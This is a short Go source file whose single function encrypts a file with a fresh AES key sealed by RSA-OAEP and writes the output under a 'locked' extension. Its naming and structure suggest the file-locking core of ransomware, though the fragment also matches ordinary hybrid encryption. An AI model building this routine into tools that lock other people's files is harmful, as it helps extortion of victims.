package main

import (
	"crypto/rsa"
	"io/ioutil"

	"crypto/aes"
	"crypto/rand"

	"crypto/cipher"

	"crypto/sha256"
)

func encrypt(file string, priv *rsa.PrivateKey) {
	data, err := ioutil.ReadFile(file)

	if err != nil {
		panic(err)
	}

	key := make([]byte, KeySize)
	rand.Read(key)

	iv := make([]byte, aes.BlockSize)
	rand.Read(iv)

	header := append(key, iv...)
	pub := priv.PublicKey

	label := []byte("")
	header, err = rsa.EncryptOAEP(sha256.New(), rand.Reader, &pub, header, label)

	if err != nil {
		panic(err)
	}

	block, err := aes.NewCipher(key)

	if err != nil {
		panic(err)
	}

	cipher := cipher.NewCFBEncrypter(block, iv)
	cipher.XORKeyStream(data, data)

	data = append(header, data...)

	ioutil.WriteFile(file+LockedExtension, data, 0777)
}
